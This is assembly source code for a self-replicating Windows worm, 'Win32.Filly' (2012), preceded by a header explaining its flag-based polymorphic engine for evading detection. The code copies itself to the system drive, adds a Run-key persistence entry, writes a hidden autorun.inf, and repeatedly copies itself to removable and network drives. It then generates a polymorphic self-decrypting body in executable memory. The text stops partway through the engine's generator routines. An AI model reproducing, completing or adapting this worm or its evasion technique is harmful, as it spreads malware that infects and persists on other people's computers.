;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;;  Win32.Filly
;;  by SPTH
;;  February 2012
;;
;;
;;  This is a worm which spreads via network/removable/USB drives.
;;
;;  It uses a novel polymorphic engine, namely the virusbody is created
;;  at runtime using flags. The virusbody does not exist in any encrypted
;;  data or transformed code, but just appears as shadow of the execution of
;;  some overlayed instruction-flow.
;;
;;  Every nibble (half byte) of the virus is represented as a code which
;;  sets or clears SF,AF,PF,CF. After the code snippet of one nibble is
;;  executed, either LAHF or PUSHFD is used to get the flags. The flags
;;  are saved in an allocated memory, which will be executed after
;;  the reconstruction.
;;
;;  It can use one out of 5 ways to fully determine SF,AF,PF,CF:
;;
;;      5 | 0+4 | 1+4 | 2+4 | 4+0
;;
;;  where each number represents a set of instruction with different behaviour
;;  with respect to flags:
;;
;;      0: CF:
;;         ROL, ROR
;;
;;      1: AF, CF (PF, SF undefined):
;;         AAA, AAS
;;
;;      2: CF PF (AF undefined, SF undefined);
;;         SHL, SHR, SAL, SAR
;;
;;      3: PF SF (AF undefined, CF undefined):
;;         AND, XOR, TEST
;;
;;      4: AF PF SF:
;;         DEC, INC
;;
;;      5: AF CF PF SF:
;;         ADD, CMP, NEG, SUB
;;
;;  All sets can be used as functional trash code, prior to the actual determining
;;  instruction sets. Registers and type (Instr Reg1, Reg2 or Instr Reg1, NNNN) are
;;  random in that case.
;;
;;  For finding the correct composition of instruction and register values to get
;;  the the desired flag combination, I use a semi-deterministic algorithm. This means
;;  i give correct flag dependences, the the code goes in a loop searching randomly
;;  for correct parameters - for each nibble of the code. In some cases, a desired
;;  combination of flags can not be created with the choosen instruction - in that case
;;  after 42 loops, an infinite-loop handler is called, which exits the loops and choses
;;  another instruction to create the flag-combination. This procedere is unexpectedly
;;  fast - in fact, even there are ~6100 random loops running, there is no noticeable
;;  delay.
;;
;;  The encrypted code-flow has a different size each generation. As its boring to code a
;;  file size adjustment tool, I keep a constant filesize with following statistical
;;  argument: In a set of 20 different files, I looked at the maximum size the used
;;  code section: 175713, 175477, 175261, 175262, 177070, 176241, 177109, 175749, 172610,
;;  176471, 174657, 174682, 175275, 176186, 176004, 174359, 173549, 174638, 174684, 173893 bytes.
;;  Average of the set: 175269 +/- 1148.65.
;;  For padding, I used average + 7 sigma = 183'312. The probability that something
;;  goes wrong is 1 / (390'682'215'445), while the probability that everything goes
;;  right is 99.999999999744% - this is enough for my taste :)
;;
;;  Now here you can see a generated code:
;;
;;         004020B5   . B8 A0AC599E    MOV EAX,9E59ACA0
;;         004020BA   . C1E0 82        SHL EAX,82
;;         004020BD   . B8 A5AF1B60    MOV EAX,601BAFA5
;;         004020C2   . 48             DEC EAX
;;         004020C3   . 9C             PUSHFD
;;         004020C4   . 5A             POP EDX
;;         004020C5   . 8817           MOV BYTE PTR DS:[EDI],DL
;;         004020C7   . 47             INC EDI
;;         004020C8   . B9 CBC5FCAC    MOV ECX,ACFCC5CB
;;         004020CD   . B8 550D859F    MOV EAX,9F850D55
;;         004020D2   . 29C1           SUB ECX,EAX
;;         004020D4   . 9C             PUSHFD
;;         004020D5   . 58             POP EAX
;;         004020D6   . AA             STOS BYTE PTR ES:[EDI]
;;         004020D7   . B8 CB5183AB    MOV EAX,AB8351CB
;;         004020DC   . B9 EEF33292    MOV ECX,9232F3EE
;;         004020E1   . D3C0           ROL EAX,CL
;;         004020E3   . BA 8B47E2EB    MOV EDX,EBE2478B
;;         004020E8   . 4A             DEC EDX
;;         004020E9   . 9F             LAHF
;;         004020EA   . 8827           MOV BYTE PTR DS:[EDI],AH
;;         004020EC   . 47             INC EDI
;;         004020ED   . BA F065255E    MOV EDX,5E2565F0
;;         004020F2   . B9 A5D9FA8B    MOV ECX,8BFAD9A5
;;         004020F7   . 01CA           ADD EDX,ECX
;;         004020F9   . B8 8E0FB438    MOV EAX,38B40F8E
;;         004020FE   . 3F             AAS
;;         004020FF   . BB 6B6AF3EA    MOV EBX,EAF36A6B
;;         00402104   . B8 7B9CB043    MOV EAX,43B09C7B
;;         00402109   . 01C3           ADD EBX,EAX
;;         0040210B   . 9F             LAHF
;;         0040210C   . 8827           MOV BYTE PTR DS:[EDI],AH
;;         0040210E   . 47             INC EDI
;;
;;  This code generates 2 bytes of the virus code.
;;
;;
;;
;;  Thanks alot to hh86 for telling me about this non-standard code
;;  representation she is working on, and for pointing out that LAHF
;;  is actually *very* useful :)
;;
;;  This is the second member of a new series of self-replicators:
;;  - Win32.Kitti (overlapping code engine; in valhalla#1)
;;  - Win32.Filly (code as shadow of overlayed instruction flow; in valhalla#2)
;;
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


include 'E:\Programme\FASM\INCLUDE\win32ax.inc'

.data
	hMyFileName dd 0x0
	hFileHandle dd 0x0
	hMapHandle  dd 0x0
	hMapViewAddress dd 0x0

	hFileCodeStart dd 0x0

	RandomNumber dd 0x0

	SpaceForHDC:	   dd 0x0   ; should be 0x0, C:\
	RandomFileName: times 13 db 0x0


	SpaceForHDC2:	   dd 0x0   ; should be 0x0, X:\
	RandomFileName2:times 13 db 0x0

	stKey: times 47 db 0x0 ; "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0x0
	hKey  dd 0x0


	stAutorunWithDrive db 0x0, 0x0, 0x0	; "X:\"
	stAutoruninf: times 12 db 0x0		; "autorun.inf"



	stAutoRunContent: times 52 db 0x0


	hCreateFileAR	     dd 0x0
	hCreateFileMappingAR dd 0x0

	constFileSize  EQU 185344
	constCodeStart EQU 0x400

	FlagMask     db 0x0   ; S00A'0P1C
		MaskNibble0 EQU 0000'0001b
		MaskNibble1 EQU 0001'0001b
		MaskNibble2 EQU 0000'0101b
		MaskNibble3 EQU 1000'0100b
		MaskNibble4 EQU 1001'0100b
		MaskNibble5 EQU 1001'0101b
		MaskRandom  EQU 0000'0000b   ; no content - for trash

	VerifiedAddress dd 0x0


	MyStartAddresse dd 0x0

	NibbleData	db 0x0

	DecryptedCode	dd 0x0



.code
start:
; ###########################################################################
; #####
; #####   Preparation (copy file, get kernel, ...)
; #####

StartEngine:
	call	GetMyStartAddresse
	GetMyStartAddresse:
		pop	eax
		sub	eax, (GetMyStartAddresse-StartEngine)

	mov	dword[MyStartAddresse], eax



	push	0x8007
	stdcall dword[SetErrorMode]

	stdcall dword[GetCommandLineA]
	mov	dword[hMyFileName], eax
	cmp	byte[eax], '"'
	jne	FileNameIsFine
	inc	eax
	mov	dword[hMyFileName], eax

	FindFileNameLoop:
		inc	eax
		cmp	byte[eax], '"'
	jne	FindFileNameLoop

	mov	byte[eax], 0x0
	FileNameIsFine:


	stdcall dword[GetTickCount]
	mov	dword[RandomNumber], eax

	xor	esi, esi
	CopyFileAndRegEntryMore:
		mov	ebx, 26
		mov	ecx, 97
		call	CreateSpecialRndNumber

		mov	byte[RandomFileName+esi], dl
		inc	esi
		cmp	esi, 8
	jb	CopyFileAndRegEntryMore

	mov	eax, ".exe"
	mov	dword[RandomFileName+esi], eax

	mov	al, "C"
	mov	byte[SpaceForHDC+1], al
	mov	al, ":"
	mov	byte[SpaceForHDC+2], al
	mov	al, "\"
	mov	byte[SpaceForHDC+3], al

	push	FALSE
	push	SpaceForHDC+1
	push	dword[hMyFileName]
	stdcall dword[CopyFileA]



; #####
; #####   Preparation (copy file, get kernel, ...)
; #####
; ###########################################################################


; ###########################################################################
; #####
; #####   Open New File
; #####

	push	0x0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	0x0
	push	0x0
	push	(GENERIC_READ or GENERIC_WRITE)
	push	SpaceForHDC+1
	stdcall dword[CreateFileA]

	cmp	eax, INVALID_HANDLE_VALUE
	je	IVF_NoCreateFile
	mov	dword[hFileHandle], eax

	push	0x0
	push	constFileSize
	push	0x0			      ; nFileSizeHigh=0 from above
	push	PAGE_READWRITE
	push	0x0
	push	dword[hFileHandle]
	stdcall dword[CreateFileMappingA]

	cmp	eax, 0x0
	je	IVF_NoCreateMap
	mov	dword[hMapHandle], eax

	push	constFileSize
	push	0x0
	push	0x0
	push	FILE_MAP_WRITE
	push	dword[hMapHandle]
	stdcall dword[MapViewOfFile]

	cmp	eax, 0x0
	je	IVF_NoMapView
	mov	dword[hMapViewAddress], eax

; #####
; #####   Open New File
; #####
; ###########################################################################

	call	DoNibbleTrafo


; ###########################################################################
; #####
; #####   Close New File
; #####

    IVF_CloseMapView:
	push	dword[hMapViewAddress]
	stdcall dword[UnmapViewOfFile]

    IVF_NoMapView:
	push	dword[hMapHandle]
	stdcall dword[CloseHandle]

    IVF_NoCreateMap:
	push	dword[hFileHandle]
	stdcall dword[CloseHandle]

    IVF_NoCreateFile:

; #####
; #####   Close New File
; #####
; ###########################################################################


;        invoke  ExitProcess, 0

; ###########################################################################
; #####
; #####   Spread this kitty ;)
; #####

SpreadKitty:
;  Representation of "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
;  One could permute it - but too lazy for doing this task atm :)

	mov	eax, stKey
	mov	dword[eax+0x00], "SOFT"
	mov	dword[eax+0x04], "WARE"
	mov	dword[eax+0x08], "\Mic"
	mov	dword[eax+0x0C], "roso"
	mov	dword[eax+0x10], "ft\W"
	mov	dword[eax+0x14], "indo"
	mov	dword[eax+0x18], "ws\C"
	mov	dword[eax+0x1C], "urre"
	mov	dword[eax+0x20], "ntVe"
	mov	dword[eax+0x24], "rsio"
	mov	dword[eax+0x28], "n\Ru"
	mov	byte[eax+0x2C], "n"

	push	0x0
	push	hKey
	push	0x0
	push	KEY_ALL_ACCESS
	push	REG_OPTION_NON_VOLATILE
	push	0x0
	push	0x0
	push	stKey
	push	HKEY_LOCAL_MACHINE
	stdcall dword[RegCreateKeyExA]

	push	16
	push	SpaceForHDC+1
	push	REG_SZ
	push	0x0
	push	0x0
	push	dword[hKey]
	stdcall dword[RegSetValueExA]

	push	dword[hKey]
	stdcall dword[RegCloseKey]

	xor	eax, eax
	mov	dword[stAutorunWithDrive], "X:\a"
	mov	dword[stAutorunWithDrive+2], "\aut"
	mov	dword[stAutoruninf+3], "orun"
	mov	dword[stAutoruninf+7], ".inf"

	mov	dword[stAutoRunContent], "[Aut"
	mov	dword[stAutoRunContent+0x04], "orun"
	mov	dword[stAutoRunContent+0x08], 0x530A0D5D
	mov	dword[stAutoRunContent+0x0C], "hell"	   ; !!!!!!!
	mov	dword[stAutoRunContent+0x10], "Exec"
	mov	dword[stAutoRunContent+0x14],  "ute="
	mov	eax, dword[RandomFileName]	  ; Filename: XXXXxxxx.exe
	mov	dword[stAutoRunContent+0x18], eax
	mov	eax, dword[RandomFileName+0x4]	  ; Filename: xxxxXXXX.exe
	mov	dword[stAutoRunContent+0x1C], eax
	mov	dword[stAutoRunContent+0x20], ".exe"
	mov	dword[stAutoRunContent+0x24], 0x73550A0D
	mov	dword[stAutoRunContent+0x28], "eAut"
	mov	dword[stAutoRunContent+0x2C], "opla"
	mov	dword[stAutoRunContent+0x30],  0x00313D79

	; i like that coding style, roy g biv! :))
	push	51
	push	0x0
	push	0x0
	push	FILE_MAP_ALL_ACCESS
	push	0x0
	push	51
	push	0x0
	push	PAGE_READWRITE
	push	0x0
	push	0x0
	push	FILE_ATTRIBUTE_HIDDEN
	push	OPEN_ALWAYS
	push	0x0
	push	0x0
	push	(GENERIC_READ or GENERIC_WRITE)
	push	stAutoruninf

	stdcall dword[CreateFileA]
	push	eax
	mov	dword[hCreateFileAR], eax
	stdcall dword[CreateFileMappingA]
	push	eax
	mov	dword[hCreateFileMappingAR], eax
	stdcall dword[MapViewOfFile]

	xor	cl, cl
	mov	esi, stAutoRunContent
	MakeAutoRunInfoMore:
		mov	bl, byte[esi]
		mov	byte[eax], bl
		inc	eax
		inc	esi
		inc	ecx
		cmp	cl, 51
	jb	MakeAutoRunInfoMore

	sub	eax, 51
	push	dword[hCreateFileAR]
	push	dword[hCreateFileMappingAR]
	push	eax
	stdcall dword[UnmapViewOfFile]
	stdcall dword[CloseHandle]
	stdcall dword[CloseHandle]

	mov	dword[SpaceForHDC2+1], "A:\."
	mov	eax, dword[RandomFileName]
	mov	dword[RandomFileName2], eax	    ; XXXXxxxx.exe
	mov	eax, dword[RandomFileName+0x04]
	mov	dword[RandomFileName2+0x04], eax    ; xxxxXXXX.exe
	mov	eax, dword[RandomFileName+0x08]
	mov	dword[RandomFileName2+0x08], eax    ; .exe


    SpreadKittyAnotherTime:
	mov	dword[SpaceForHDC2], 0x003A4100    ; 0x0, "A:", 0x0

    STKAnotherRound:
	push	SpaceForHDC2+1
	stdcall dword[GetDriveTypeA]

	xor	ebx, ebx	; 0 ... No Drive
				; 1 ... Drive (without autorun.inf)
				; 2 ... Drive (with autorun.inf)

	mov	cl, '\'
	mov	byte[SpaceForHDC2+3],cl


	cmp	al, 0x2
	je	STKWithAutoRun

	cmp	al, 0x3
	je	STKWithoutAutoRun

	cmp	al, 0x4
	je	STKWithAutoRun

	cmp	al, 0x6
	je	STKWithAutoRun

	jmp	STKCreateEntriesForNextDrive

	STKWithAutoRun:

	push	FALSE
	push	stAutorunWithDrive
	push	stAutoruninf
	stdcall dword[CopyFileA]

	STKWithoutAutoRun:

	push	FALSE
	push	SpaceForHDC2+1
	push	SpaceForHDC+1
	stdcall dword[CopyFileA]


	STKCreateEntriesForNextDrive:
	xor	eax, eax
	mov	al, byte[SpaceForHDC2+1]
	cmp	al, "Z"
	je	SpreadThisKittyEnd

	inc	al
	mov	byte[SpaceForHDC2+1], al	; next drive
	mov	byte[stAutorunWithDrive], al	; next drive
	mov	byte[SpaceForHDC2+3], ah	; 0x0, "X:", 0x0
    jmp STKAnotherRound


    SpreadThisKittyEnd:
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x8000 - 1)	; 0-32 sec

	push	eax
	stdcall dword[Sleep]

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x100-1)
	jnz	SpreadKittyAnotherTime

jmp	SpreadKittyAnotherTime

; #####
; #####   Spread this kitty ;)
; #####
; ###########################################################################



DoNibbleTrafo:

	mov	edi, dword[hMapViewAddress]
	add	edi, constCodeStart

;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; First create the VirtualAlloc code and save the value
;;

   virtual at 0 		; cool FASM feature:
				; this compiles code virtually
				; and one can use variables to access it
				; ideal for our purpose :)
	invoke	VirtualAlloc, 0x0, 100'000, 0x1000, PAGE_EXECUTE_READWRITE
	mov	dword[DecryptedCode], eax
	xchg	edi, eax
	mov	edi, edi	; just for padding...
				; uuhh, do we know this instruction? ;)

	load iVirtualCodeA dword from 0
	load iVirtualCodeB dword from 4
	load iVirtualCodeC dword from 8
	load iVirtualCodeD dword from 12
	load iVirtualCodeE dword from 16
	load iVirtualCodeF dword from 20
	load iVirtualCodeG dword from 24  ; i hate "word", 2byte data-types.
   end virtual				 ; they are just unelegant...


	mov	dword[edi+00], iVirtualCodeA
	mov	dword[edi+04], iVirtualCodeB
	mov	dword[edi+08], iVirtualCodeC
	mov	dword[edi+12], iVirtualCodeD
	mov	dword[edi+16], iVirtualCodeE
	mov	dword[edi+20], iVirtualCodeF
	mov	dword[edi+24], iVirtualCodeG
	add	edi, 26

	mov	dword[VerifiedAddress], edi

;;
;; First create the VirtualAlloc code and save the value
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; Now create the whole representation of the code in form of flags
;; of some other random code ( main engine )
;;
	mov	esi, dword[MyStartAddresse]

    CreateCodeForAllBytes:
	mov	al, byte[esi]

	mov	byte[NibbleData], al
	and	byte[NibbleData], 0000'1111b
	push	esi
	call	CreateCodeForNibble
	pop	esi

	mov	al, byte[esi]
	shr	al, 4		  ; get the second nibble of this byte
	mov	byte[NibbleData], al
	and	byte[NibbleData], 0000'1111b
	push	esi
	call	CreateCodeForNibble
	pop	esi

	inc	esi

	mov	ebx, dword[MyStartAddresse]
	add	ebx, (WholeCodeEnd-StartEngine)
	cmp	esi, ebx
    jne CreateCodeForAllBytes


;;
;; Now create the whole representation of the code in form of flags
;; of some other random code ( main engine )
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; In the end, rearrange the information to extract the viral code
;;

   virtual at 0
	    mov     ecx, dword[DecryptedCode]
	    mov     edx, ecx

	ReorganizeMore:
	    mov     bh, byte[ecx]
	    inc     ecx
		    push   0			  ; Some PIC workaround :)
		    jmp    Decrypt
		    ReorganizeFirstNibbleBack:

	    and     al, 0000'1111b
	    push    eax



	    mov     bh, byte[ecx]
	    inc     ecx

		    push   1
		    jmp    Decrypt
		    ReorganizeSecondNibbleBack:

	    and     al, 0000'1111b
	    shl     al, 4
	    pop     ebx
	    add     al, bl

	    mov     byte[edx], al
	    inc     edx
	    mov     eax, dword[DecryptedCode]
	    add     eax, (WholeCodeEnd-StartEngine)

	    cmp     edx, eax
	jne ReorganizeMore

	jmp dword[DecryptedCode]


    Decrypt:

    ; in:   bh=S00A'0P1C
    ; out:  al=0000'SAPC
	    mov     al, bh	   ; al=S00A'0P1C
	    and     al, 0000'0001b ; al=0000'000C

	    shr     bh, 1	   ; bh=0S00'A0P1
	    push    ebx
	    and     bh, 0000'0010b ; bh=0000'00P0
	    add     al, bh	   ; al=0000'00PC

	    pop     ebx 	   ; bh=0S00'A0P1
	    shr     bh, 1	   ; bh=00S0'0A0P
	    push    ebx
	    and     bh, 0000'0100b ; bh=0000'0A00
	    add     al, bh	   ; al=0000'0APC

	    pop     ebx 	   ; bh=00S0'0A0P
	    shr     bh, 2	   ; bh=0000'S00A
	    and     bh, 0000'1000b ; bh=0000'S000
	    add     al, bh	   ; al=0000'SAPC

	    pop     ebx
	    test    ebx, ebx

    jz	    ReorganizeFirstNibbleBack
    jmp     ReorganizeSecondNibbleBack

	load cVirtualCodeA dword from 0 	; Most likely there is a more elegant
	load cVirtualCodeB dword from 4 	; way to handle this requirement
	load cVirtualCodeC dword from 8 	; using a FASM macro.
	load cVirtualCodeD dword from 12
	load cVirtualCodeE dword from 16	; But i couldnt find one - tell me
	load cVirtualCodeF dword from 20	; if you know a way to copy data
	load cVirtualCodeG dword from 24	; to a memory addresse from a
	load cVirtualCodeH dword from 28	; virtual compilation space.
	load cVirtualCodeI dword from 32
	load cVirtualCodeJ dword from 36
	load cVirtualCodeK dword from 40
	load cVirtualCodeL dword from 44
	load cVirtualCodeM dword from 48
	load cVirtualCodeN dword from 52
	load cVirtualCodeO dword from 56
	load cVirtualCodeP dword from 60
	load cVirtualCodeQ dword from 64
	load cVirtualCodeR dword from 68
	load cVirtualCodeS dword from 72
	load cVirtualCodeT dword from 76
	load cVirtualCodeU dword from 80
	load cVirtualCodeV dword from 84
	load cVirtualCodeW dword from 88
	load cVirtualCodeX byte  from 92

   end virtual

	mov	dword[edi+00], cVirtualCodeA
	mov	dword[edi+04], cVirtualCodeB
	mov	dword[edi+08], cVirtualCodeC
	mov	dword[edi+12], cVirtualCodeD
	mov	dword[edi+16], cVirtualCodeE
	mov	dword[edi+20], cVirtualCodeF

	mov	dword[edi+24], cVirtualCodeG
	mov	dword[edi+28], cVirtualCodeH
	mov	dword[edi+32], cVirtualCodeI
	mov	dword[edi+36], cVirtualCodeJ
	mov	dword[edi+40], cVirtualCodeK

	mov	dword[edi+44], cVirtualCodeL
	mov	dword[edi+48], cVirtualCodeM
	mov	dword[edi+52], cVirtualCodeN
	mov	dword[edi+56], cVirtualCodeO
	mov	dword[edi+60], cVirtualCodeP

	mov	dword[edi+64], cVirtualCodeQ
	mov	dword[edi+68], cVirtualCodeR
	mov	dword[edi+72], cVirtualCodeS
	mov	dword[edi+76], cVirtualCodeT
	mov	dword[edi+80], cVirtualCodeU

	mov	dword[edi+84], cVirtualCodeV
	mov	dword[edi+88], cVirtualCodeW
	mov	byte[edi+92],  cVirtualCodeX

;;
;; In the end, rearrange the information to extract the viral code
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;


ret


CreateCodeForNibble:
; 5 possible algos:
; -> 5
; -> 0+4 | 1+4 |2+4
; -> 4+0


	 CreateCodeBeginTrash:
	 call	 GetRandomNumber
	 test	 byte[RandomNumber+1], 0000'0011b
	 jnz	 DoNibbleFindAlgo_NoTrashBegin
		 mov	 byte[FlagMask], MaskRandom
		 mov	 bl, byte[RandomNumber+2]
	 call	 GetRandomNumber

		 mov	 al, byte[RandomNumber]
		 and	 al, 0000'0111b

	     jz  GC_Trash_Not0
		 call	 GenerateNibble0
		 jmp	 CreateCodeBeginTrash

	     GC_Trash_Not0:
		 dec	 al
	     jz  GC_Trash_Not1
		 call	 GenerateNibble1
		 jmp	 CreateCodeBeginTrash

	     GC_Trash_Not1:
		 dec	 al
	     jz  GC_Trash_Not2
		 call	 GenerateNibble2
		 jmp	 CreateCodeBeginTrash

	     GC_Trash_Not2:
		 dec	 al
	     jz  GC_Trash_Not3
		 call	 GenerateNibble3
		 jmp	 CreateCodeBeginTrash

	     GC_Trash_Not3:
		 dec	 al
	     jz  GC_Trash_Not4
		 call	 GenerateNibble4
		 jmp	 CreateCodeBeginTrash

	     GC_Trash_Not4:
		 dec	 al
	     jz  CreateCodeBeginTrash
		 call	 GenerateNibble5

	jmp  CreateCodeBeginTrash
	DoNibbleFindAlgo_NoTrashBegin:


	DoNibbleNewRnd:
		call	GetRandomNumber
		mov	al, byte[RandomNumber]
		and	al, 0000'0111b
		cmp	al, 4
	ja	DoNibbleNewRnd

	test	al, -1

	jnz	DoNibbleFindAlgoNot5
					    ; -> 5
		mov	byte[FlagMask], MaskNibble5
		mov	bl, byte[NibbleData]
		call	GenerateNibble5
	    jmp DoNibbleFinalize



     DoNibbleFindAlgoNot5:

	dec	al
	jnz	DoNibbleFindAlgoNot04
					   ; -> 0+4

		mov	byte[FlagMask], MaskNibble0
		mov	bl, byte[NibbleData]
		call	GenerateNibble0

		mov	byte[FlagMask], MaskNibble4
		mov	bl, byte[NibbleData]
		call	GenerateNibble4
	    jmp DoNibbleFinalize



     DoNibbleFindAlgoNot04:

	dec	al
	jnz	DoNibbleFindAlgoNot14
					    ; -> 1+4
		mov	byte[FlagMask], MaskNibble5   ; need to clear AF first,
		mov	bl, byte[RandomNumber+3]      ; otherwise AAA/AAS influence CF
		and	bl, 0000'1011b		      ; clear AF
		call	GenerateNibble5

		mov	byte[FlagMask], MaskNibble1
		mov	bl, byte[NibbleData]
		call	GenerateNibble1

		mov	byte[FlagMask], MaskNibble4
		mov	bl, byte[NibbleData]
		call	GenerateNibble4
	    jmp DoNibbleFinalize



     DoNibbleFindAlgoNot14:

	dec	al
	jnz	DoNibbleFindAlgoNot24
					    ; -> 2+4
		mov	byte[FlagMask], MaskNibble2
		mov	bl, byte[NibbleData]
		call	GenerateNibble2

		mov	byte[FlagMask], MaskNibble4
		mov	bl, byte[NibbleData]
		call	GenerateNibble4
	    jmp DoNibbleFinalize



     DoNibbleFindAlgoNot24:
					    ; -> 4+0

		mov	byte[FlagMask], MaskNibble4
		mov	bl, byte[NibbleData]
		call	GenerateNibble4

		mov	byte[FlagMask], MaskNibble0
		mov	bl, byte[NibbleData]
		call	GenerateNibble0
;            jmp DoNibbleFinalize


     DoNibbleFinalize:

	call	GetRandomNumber
	test	byte[RandomNumber], 0001'0000b	       ; LAHF or PUSHFD+POP?
	jnz	DoNF_PUSHFD

	mov	byte[edi], 0x9F 		       ; LAHF
	inc	edi

	test	byte[RandomNumber], 0000'1000b
	jnz	DoNibbleFin_AH

	test	byte[RandomNumber], 0000'0010b
	jnz	DoNibbleFinAL_2

	mov	byte[edi+00], 0x88
	mov	byte[edi+01], 0xE0	; mov al, ah
    jmp DoNibbleFinAL_2_X

    DoNibbleFinAL_2:
	mov	byte[edi+00], 0x86
	mov	byte[edi+01], 0xC4	; xchg ah, al
	test	byte[RandomNumber], 0000'0100b
	jnz	DoNibbleFinAL_2_X

	mov	byte[edi+01], 0xE0	; xchg al, ah
      DoNibbleFinAL_2_X:

	mov	byte[edi+02], 0xAA	; stos
	add	edi, 3
    jmp DoNibbleEnd



    DoNibbleFin_AH:
	mov	byte[edi+00], 0x88
	mov	byte[edi+01], 0x27	; mov   byte[edi], ah
	mov	byte[edi+02], 0x47	; inc edi (thx hh86 :D)
	add	edi, 3
    jmp DoNibbleEnd


    DoNF_PUSHFD:
	mov	byte[edi], 0x9C 	; pushfd
	inc	edi

	test	byte[RandomNumber], 0100'0000b
	jnz	DoNF_PUSHFD_AL


	mov	al, byte[RandomNumber]
	and	al, 0000'0011b
	add	al, 0x58
	mov	byte[edi+00], al	; pop e(a|c|d|b)x

	mov	byte[edi+01], 0x88
	and	al, 0000'0011b
	shl	al, 3
	or	al, 0000'0111b
	mov	byte[edi+02], al	; mov byte[edi], (a|c|d|b)l
	mov	byte[edi+03], 0x47	; inc edi (thx hh86 :D)
	add	edi, 4
    jmp DoNibbleEnd

    DoNF_PUSHFD_AL:
	mov	byte[edi+00], 0x58	; pop eax
	mov	byte[edi+01], 0xAA	; stos
	add	edi, 2
;    jmp DoNibbleEnd

    DoNibbleEnd:

	mov	dword[VerifiedAddress], edi

ret

; ###########################################################################
; #####
; #####   Generate Nibbles
; #####




; ###########################################################################
; #####  Nibble 0: CF - (ROL, ROR)

GenerateNibble0:
; edi             ... pointer in filecode
; bl & 0000'1111b ... nibble to generate


; ebp:
; 0  ... rol Reg, 1
; 1  ... rol Reg, cl

; 3  ... ror Reg, cl



	call	InformationToFlagByte	; bh=flag byte

    GN0_GetTypeAgain:
	call	GetRandomNumber
	mov	ebp, dword[RandomNumber]
	and	ebp, 0000'0011b

	cmp	ebp, 2
	je	GN0_GetTypeAgain

	push	0			 ; loop counter

    GN0_CF_loop:			 ; rol Reg, 1

	pop	ecx
	inc	ecx
	push	ecx
	cmp	ecx, 0x2A
	ja	GN_PossibleInfinitLoop

	GN0_CF_GetAnotherCL:
		call	GetRandomNumber
		mov	ecx, dword[RandomNumber]

		test	ecx, 0001'1111b        ; shiftcount must not be zero
	jz	GN0_CF_GetAnotherCL


	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	push	eax

	cmp	ebp, 0
	jne	GN0_CF_loop_ROLN

	rol	eax, 1
    jmp GN0_CF_loop_LAHF

    GN0_CF_loop_ROLN:			  ; rol Reg, N/cl
	cmp	ebp, 1
	jne	GN0_CF_loop_RORN

	rol	eax, cl
    jmp GN0_CF_loop_LAHF

    GN0_CF_loop_RORN:			  ; ror Reg, N/cl
	ror	eax, cl
;    jmp GN0_CF_loop_LAHF


    GN0_CF_loop_LAHF:
	lahf

	pop	edx

	and	ah, byte[FlagMask]
	and	bh, byte[FlagMask]

	cmp	ah, bh
    jne GN0_CF_loop

	pop	eax	; remove counter

    GN0_GetDifferentRegister:
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	al, 0000'0011b
	cmp	al, 0000'0001b
    je	GN0_GetDifferentRegister	; dont use ECX because we can use CL as second parameter (~2h to find this :) )

	or	al, 0xB8		; al=1011'10NN - NN...random  (eax, ebx, ecx, edx)
	mov	byte[edi], al
	inc	edi

	mov	dword[edi], edx
	add	edi, 4

	push	ebp
	and	ebp, 0000'0001b
	pop	ebp
	jnz	GN0_CFN 	     ; is it "rotate Reg, 1" ?

	mov	byte[edi], 0xD1
	inc	edi

	and	al, 0000'0011b
	cmp	ebp, 0
	jne	GN0_CF_CreateCode_ROR
	add	al, 0xC0
    jmp GN0_CF_CreateCode_done

    GN0_CF_CreateCode_ROR:
	add	al, 0xC8

    GN0_CF_CreateCode_done:
	mov	byte[edi], al
	inc	edi
    jmp GN0_CF_End



    GN0_CFN:

	mov	byte[edi], 0xB9
	inc	edi

	mov	dword[edi], ecx
	add	edi, 4

	mov	byte[edi], 0xD3
	inc	edi

	and	al, 0000'0011b

	and	ebp, 0000'0010b
	jnz	GN0_CFN_ROR

	add	al, 0xC0
    jmp GN0_CF_Write_End

    GN0_CFN_ROR:
	add	al, 0xC8

    GN0_CF_Write_End:
	mov	byte[edi], al
	inc	edi



    GN0_CF_End:
	mov	dword[VerifiedAddress], edi

ret


; #####  Nibble 0: CF - (ROL, ROR)
; ###########################################################################




; ###########################################################################
; #####  Nibble 1: AF, CF (PF, SF undefined) - (AAA, AAS)

GenerateNibble1:
; edi             ... pointer in filecode
; bl & 0000'1111b ... nibble to generate



	call	InformationToFlagByte	; bh=flag byte

	call	GetRandomNumber
	mov	ebp, dword[RandomNumber]
	and	ebp, 0000'0001b

	push	0			 ; loop counter

    GN1_Loop:

	pop	eax
	inc	eax
	push	eax
	cmp	eax, 0x2A
	ja	GN_PossibleInfinitLoop

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	push	eax

	cmp	ebp, 0			; this instruction clears AF. Thats important because
	jne	GN1_Aaa 		; AAA and AAS depend on AF, and influence CF depending on it.

	aas
	jmp	GN1_LAHF

     GN1_Aaa:
	aaa
	jmp	GN1_LAHF

     GN1_LAHF:
	pop	edx

	lahf

	and	ah, byte[FlagMask]
	and	bh, byte[FlagMask]
	cmp	ah, bh
    jne GN1_Loop

	pop	eax	; remove counter

	mov	byte[edi], 0xB8
	inc	edi

	mov	dword[edi], edx 	; mov Reg1, NUMBER
	add	edi, 4


	cmp	ebp, 0
	jne	GN1_WriteAaa

	mov	byte[edi], 0x3F
	inc	edi
	jmp	GN1_Fin

     GN1_WriteAaa:
	mov	byte[edi], 0x37
	inc	edi

   GN1_Fin:
	mov	dword[VerifiedAddress], edi


ret


; #####  Nibble 1: AF, CF (PF, SF undefined) - (AAA, AAS)
; ###########################################################################




